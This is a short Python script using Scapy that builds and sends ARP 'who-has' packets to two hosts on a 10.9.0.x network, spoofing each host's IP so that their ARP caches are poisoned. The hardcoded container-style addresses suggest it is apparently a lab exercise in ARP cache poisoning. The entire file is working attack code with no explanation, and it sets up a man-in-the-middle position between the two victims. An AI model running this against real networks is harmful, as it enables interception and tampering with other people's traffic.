#!/usr/bin/env python3
from scapy.all import *

ipA = "10.9.0.5"
MacA = "02:42:0a:09:00:05"
ipB = "10.9.0.6"
MacB = "02:42:0a:09:00:06"

def get_arp_spoof_pkt(victim_ip, victim_mac, spoof_ip):
    E_layer = Ether()
    E_layer.dst = victim_mac
    A_layer = ARP()
    A_layer.psrc = spoof_ip
    A_layer.pdst = victim_ip
    A_layer.op = "who-has"
    return E_layer / A_layer



pkt_a = get_arp_spoof_pkt(ipA, MacA, ipB)
pkt_b = get_arp_spoof_pkt(ipB, MacB, ipA)
pkt_a.show()
pkt_b.show()
sendp(pkt_a)
sendp(pkt_b)
